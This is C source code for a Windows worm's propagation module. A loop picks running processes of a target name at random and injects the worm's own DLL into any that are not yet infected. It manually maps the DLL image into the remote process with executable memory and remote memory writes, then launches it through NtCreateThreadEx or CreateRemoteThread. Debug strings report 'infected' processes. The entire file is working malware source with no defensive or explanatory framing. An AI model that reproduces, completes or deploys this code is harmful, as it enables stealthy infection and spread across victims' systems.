#include "main.h"

VOID propagate_dll_thread(LPCSTR target_process_name)
{
	HANDLE				event_handle;
	DWORD				target_pid,
						pid_array[MAX_PIDS];
	CHAR				event_string[1024];
	INT					i;

	// Main loop to check for uninfected PIDs
	while (TRUE) {
		Sleep(2500);

		// Locate all PIDs
		ZeroMemory(pid_array, sizeof(pid_array));
		find_pid((char *)target_process_name, pid_array);
		//DbgPrint("+worm[%d]> PIDs found\n", GetCurrentProcessId());

		// Attempt to find an uninfected PID
		i = 0;
		while (TRUE) {
			Sleep(generate_random_byte_range(10) * 100);

			// Select random pid
			target_pid = get_random_pid(pid_array);
			if (target_pid == GetCurrentProcessId()) {
				continue;
			}

			if (target_pid == 0) {
				// No more pids
				break;
			}
#ifdef DEBUG_OUT
			//DEBUG("+worm[%d]> Selecting pid %d\n", GetCurrentProcessId(), target_pid);
#endif

			ZeroMemory(event_string, sizeof(event_string));
			f_itoa(target_pid, event_string, 10);
			//sprintf(event_string, "GLOBAL\\%d", pid_array[i]);

			// Attempt to infect
			event_handle = OpenEventA(READ_CONTROL, FALSE, (LPCSTR)event_string);
			if ((event_handle == NULL) && (target_pid != 0)) {

#ifndef _WIN64
				if (propagate_dll(target_pid, (char *)target_process_name, DLL_MAIN_ENTRY_POINT) == 0) {
#else
				if (propagate_dll(target_pid, (char *)target_process_name, DROPPER_ENTRY_POINT64) == 0) {
#endif

					/*
#ifdef DEBUG_OUT
					send_debug_channel("!worm[%d]> Failed to infect pid %d (%s)!\n", GetCurrentProcessId(), target_pid, target_process_name);
#endif
					*/

					CloseHandle(event_handle);
					continue;
				} 

#ifdef DEBUG_OUT 
				else {

					send_debug_channel("+worm[%d] Infected process %d", GetCurrentProcessId(), target_pid);
				}
#endif

#ifdef SLEEP_AFTER_ONE_REP
				DbgPrint("+worm[%d]> Going to sleep (SLEEP_AFTER_ONE_REP)\n", GetCurrentProcessId());
				Sleep(INFINITE);
#endif

				Sleep(1000);
				break;
			} 
			CloseHandle(event_handle);
		}
	}
}

DWORD get_random_pid(DWORD pid_array[MAX_PIDS])
{
	PDWORD					ptr, tmp;
	DWORD					output;
	INT						i, random;

	// Check if there is work to be done
	if (pid_array[0] == 0) {
		return 0;
	}

	// Count the number of pids
	i = 0;
	while (pid_array[i] != 0) {
		i++;
	}

	if (i > 1) {
		random = generate_random_byte_range(i - 1);
	} else {
		random = 0;
	}
	output = pid_array[random];

	// Remove from pool
	ptr = &pid_array[random];
	tmp = &pid_array[random + 1];

	if (*tmp == 0) {
		*ptr = 0;

		return output;
	}

	while (*tmp != (DWORD)0) {

		*ptr = 0;
		*ptr = *tmp;
		*tmp = 0;

		ptr++;
		tmp++;
	}

	return output;
}

DWORD propagate_dll(	DWORD	pid,
						LPCSTR	process_name,
						LPCSTR	oep)
{
	ERROR_CODE						status;

	PNTCREATETHREADEXBUFFER			ntcreatethreadbuffer;		

#ifndef _WIN64
	MEMORY_BASIC_INFORMATION		memory_basic_information				= {0};
#else
	MEMORY_BASIC_INFORMATION64		memory_basic_information				= {0};
#endif
	LPTHREAD_START_ROUTINE			entry_point;

	LNtCreateThreadEx				f_NtCreateThreadEx;
	LZwWriteVirtualMemory			f_ZwWriteVirtualMemory;

	PIMAGE_DOS_HEADER				dos_header;
	PIMAGE_NT_HEADERS				nt_headers;
	PIMAGE_SECTION_HEADER			section_header;

	HMODULE							ntdll;
	HANDLE							remote_process;

	PDWORD							local_virtual_dll,
									local_raw_dll,
									remote_virtual_dll,
									remote_raw_dll;
	
	PHANDLE							remote_thread;

	PVOID							local_dll_base;

	PBYTE							ptr;
	CHAR							query_proc_name[MAX_PATH]				= {0};

	INT								i, junk;

#ifdef DISABLE_SVCHOST_INFECTION

	// Check if this is svchost.exe process, if so, do not infect
	remote_process = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
	if (remote_process == NULL) {
		return NULL;
	}

	GetProcessImageFileNameA(remote_process, query_proc_name, sizeof(query_proc_name));
	ptr = (PBYTE)&query_proc_name[0];
	while (*ptr != 0) {
		ptr++;
	}
	while (*ptr != '\\') {
		ptr--;
	}
	ptr++;


	CloseHandle(remote_process);
	remote_process = NULL;

	if (!string_compare((LPCSTR)ptr, SVCHOST_STRING, string_length(SVCHOST_STRING))) {

		/*
#ifdef DEBUG_OUT
		send_debug_channel("+worm> Avoiding %s", SVCHOST_STRING);
#endif
		*/

		return NULL;
	}

#endif

#ifdef DEBUG_OUT
	DEBUG("+worm[%d] Target PID: %d [%s]", GetCurrentProcessId(), pid, process_name);
#endif

#ifndef _WIN64
	local_dll_base = (PVOID)get_local_dll_base();
#else
	local_dll_base = (PVOID)get_local_dll_base64();
#endif

	ntdll = GetModuleHandleA("ntdll.dll");
	if (ntdll == NULL) {
#ifdef DEBUG_OUT
		DEBUG("!worm[%d]> Couldn't get handle to ntdll\n", GetCurrentProcessId());
#endif
		return NULL;
	}

	//BREAK;
	f_ZwWriteVirtualMemory	= (LZwWriteVirtualMemory)GetProcAddress(ntdll, "ZwWriteVirtualMemory");

	// Get local infos
	dos_header				= (PIMAGE_DOS_HEADER)local_dll_base;
	nt_headers				= (PIMAGE_NT_HEADERS)((SIZE_T)local_dll_base + dos_header->e_lfanew);

	// Setup working buffers
#ifndef _WIN64
	VirtualQuery(dll_image, &memory_basic_information, sizeof(MEMORY_BASIC_INFORMATION));
#else
	VirtualQuery(dll_image, &memory_basic_information, sizeof(MEMORY_BASIC_INFORMATION64));
#endif


	// Allocate memory for local stuff
	local_virtual_dll		= (PDWORD)VirtualAlloc(NULL, nt_headers->OptionalHeader.SizeOfImage, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	local_raw_dll			= (PDWORD)VirtualAlloc(NULL, memory_basic_information.RegionSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	remote_thread			= (PHANDLE)VirtualAlloc(NULL, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	CopyMemory(local_raw_dll, dll_image, memory_basic_information.RegionSize);

	ntcreatethreadbuffer	= (PNTCREATETHREADEXBUFFER)VirtualAlloc(NULL, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);

	// Get handle to remote process
	remote_process = OpenProcess(	PROCESS_CREATE_THREAD | 
									PROCESS_QUERY_INFORMATION | 
									PROCESS_SUSPEND_RESUME | 
									PROCESS_VM_WRITE |
									PROCESS_VM_OPERATION
									, FALSE, pid);
	if (remote_process == NULL) {

		status = GetLastError();

#ifdef DEBUG_OUT
		DEBUG("!worm[%d]> Failed to open process %d with error 0x%08x", GetCurrentProcessId(), pid, status);
#endif

		VirtualFree(local_virtual_dll, nt_headers->OptionalHeader.SizeOfImage, MEM_DECOMMIT);
		VirtualFree(local_raw_dll, memory_basic_information.RegionSize, MEM_DECOMMIT);
		VirtualFree(remote_thread, 0x1000, MEM_DECOMMIT);
		VirtualFree(ntcreatethreadbuffer, 0x1000, MEM_DECOMMIT);		

		return NULL;
	}

	// Copy headers to local_virtual_dll
	//BREAK;
	CopyMemory(local_virtual_dll, dll_image, nt_headers->OptionalHeader.SizeOfHeaders);

	// Copy sections to local_virtual_dll
	section_header = IMAGE_FIRST_SECTION(nt_headers);
	for (i = 0; i < nt_headers->FileHeader.NumberOfSections; i++) {

		if (section_header->PointerToRawData == 0) {
			section_header++;
			continue;
		}

		CopyMemory(	(PVOID)((DWORD_PTR)local_virtual_dll + section_header->VirtualAddress),
					(PVOID)((DWORD_PTR)dll_image + section_header->PointerToRawData),
					(UINT)section_header->SizeOfRawData);

		section_header++;
	}

	// Allocate memory in remote process
	remote_virtual_dll = (PDWORD)VirtualAllocEx(	remote_process, 
													(LPVOID)nt_headers->OptionalHeader.ImageBase, 
													nt_headers->OptionalHeader.SizeOfImage, 
													MEM_RESERVE | MEM_COMMIT, 
													PAGE_EXECUTE_READWRITE);
	if (remote_virtual_dll == NULL) {
		remote_virtual_dll  = (PDWORD)VirtualAllocEx(	remote_process, 
														NULL, 
														nt_headers->OptionalHeader.SizeOfImage, 
														MEM_RESERVE | MEM_COMMIT, 
														PAGE_EXECUTE_READWRITE);
		/*
#ifdef DEBUG_OUT
		ntStatus = GetLastError();
		send_debug_channel("!worm[%d]> Failed to write memory to process %d with error 0x%08x", GetCurrentProcessId(), pid, ntStatus);
#endif
		*/

		VirtualFree(local_virtual_dll, nt_headers->OptionalHeader.SizeOfImage, MEM_DECOMMIT);
		VirtualFree(local_raw_dll, memory_basic_information.RegionSize, MEM_DECOMMIT);
		VirtualFree(remote_thread, 0x1000, MEM_DECOMMIT);
		VirtualFree(ntcreatethreadbuffer, 0x1000, MEM_DECOMMIT);

		return NULL;
	}

	// Relocate - FIXME - base is static
#ifndef _WIN64
	fix_image_base_relocs((PBYTE)local_virtual_dll, remote_virtual_dll, (PBYTE)remote_virtual_dll);
#endif

	// Write virtual dll to remote memory
	junk = 0;
	f_ZwWriteVirtualMemory(	remote_process, 
							remote_virtual_dll, 
							local_virtual_dll, 
							nt_headers->OptionalHeader.SizeOfImage, 
							(SIZE_T *)&junk);

	// Copy raw DLL to remote mem
	remote_raw_dll		= (PDWORD)VirtualAllocEx(	remote_process, 
													NULL, 
													memory_basic_information.RegionSize, 
													MEM_RESERVE | MEM_COMMIT, 
													PAGE_READWRITE);

	// Copy over remote raw dll
	f_ZwWriteVirtualMemory(	remote_process, 
							remote_raw_dll, 
							dll_image, 
							memory_basic_information.RegionSize, 
							(SIZE_T *)&junk);

	// Get our entry points
	//BREAK;
	// Something is misaligned in the virtual DLL
	//BREAK;
#ifndef _WIN64
	entry_point = locate_dll_entry_point(local_virtual_dll, oep, remote_virtual_dll);
#else
	entry_point = locate_dll_entry_point64(local_virtual_dll, oep, remote_virtual_dll);
#endif

#ifdef DEBUG_OUT
#ifdef _WIN64
	DEBUG("worm[%d] Entry point found: 0x%16x", GetCurrentProcessId(), entry_point);
#endif
#endif

#ifdef DEBUG_OUT
	DEBUG("worm[%d]> Resolving NtCreateThreadEx...");
#endif
	f_NtCreateThreadEx = (LNtCreateThreadEx)GetProcAddress(ntdll, "NtCreateThreadEx");
	//BREAK;
#ifdef DO_NOT_USE_NTCREATETHREADEX
	f_NtCreateThreadEx = NULL;
#ifdef DEBUG_OUT
	DEBUG("worm[%d]> Warning: overriding NtCreateThreadEx");
#endif
#endif
	if (f_NtCreateThreadEx == NULL) {
		// Maybe XP or earlier. Try again with CreateRemoteThread

		status = (ERROR_CODE)CreateRemoteThread(	remote_process,
													NULL,
													0,
													entry_point,
													remote_raw_dll,
													0,
													NULL);

		VirtualFree(local_virtual_dll, nt_headers->OptionalHeader.SizeOfImage, MEM_DECOMMIT);
		VirtualFree(local_raw_dll, memory_basic_information.RegionSize, MEM_DECOMMIT);
		VirtualFree(remote_thread, 0x1000, MEM_DECOMMIT);
		VirtualFree(ntcreatethreadbuffer, 0x1000, MEM_DECOMMIT);

		if (status == 0) {

#ifdef DEBUG_OUT
			status = GetLastError();
			DEBUG("!worm[%d]> CreateRemoteThread Failed in process %d with error 0x%08x!!!", GetCurrentProcessId(), pid, GetLastError());
#endif

			return FALSE;
		}

		return TRUE;
	}

#ifdef DEBUG_OUT
	//DEBUG("+worm[%d] Target PID: %d [%s] Precall", GetCurrentProcessId(), pid, process_name);
#endif

	ZeroMemory((void *)ntcreatethreadbuffer, sizeof(ntcreatethreadbuffer));
	ntcreatethreadbuffer->Size		= sizeof(NTCREATETHREADEXBUFFER);
	ntcreatethreadbuffer->Unknown1	= 0x10003;
	ntcreatethreadbuffer->Unknown2	= 0x8;		//
	ntcreatethreadbuffer->Unknown3	= (PDWORD)((DWORD)remote_thread + 64);
	ntcreatethreadbuffer->Unknown4	= 0;
	ntcreatethreadbuffer->Unknown5	= 0x10004;
	ntcreatethreadbuffer->Unknown6	= 4;
	ntcreatethreadbuffer->Unknown7	= (PDWORD)((DWORD)remote_thread + 128);
	ntcreatethreadbuffer->Unknown8	= 0;


	//BREAK;
	status = f_NtCreateThreadEx(	remote_thread,
									0x1FFFFF,
									NULL,
									remote_process,
									(LPTHREAD_START_ROUTINE)entry_point,
									remote_raw_dll,
									FALSE,
									NULL,
									NULL,
									NULL,
									ntcreatethreadbuffer);

	if (remote_thread == NULL) {
#ifdef DEBUG_OUT
		DEBUG("!worm[%d]> f_NtCreateThreadEx failed\n", GetCurrentProcessId());
#endif
	}


	// Cleanup
	VirtualFree(local_virtual_dll, nt_headers->OptionalHeader.SizeOfImage, MEM_DECOMMIT);
	VirtualFree(local_raw_dll, memory_basic_information.RegionSize, MEM_DECOMMIT);
	VirtualFree(remote_thread, 0x1000, MEM_DECOMMIT);
	VirtualFree(ntcreatethreadbuffer, 0x1000, MEM_DECOMMIT);

#ifdef DEBUG_OUT
	DEBUG("+worm[%d] Target PID: %d [%s] Thread Started!", GetCurrentProcessId(), pid, process_name);
#endif

	return TRUE;
}

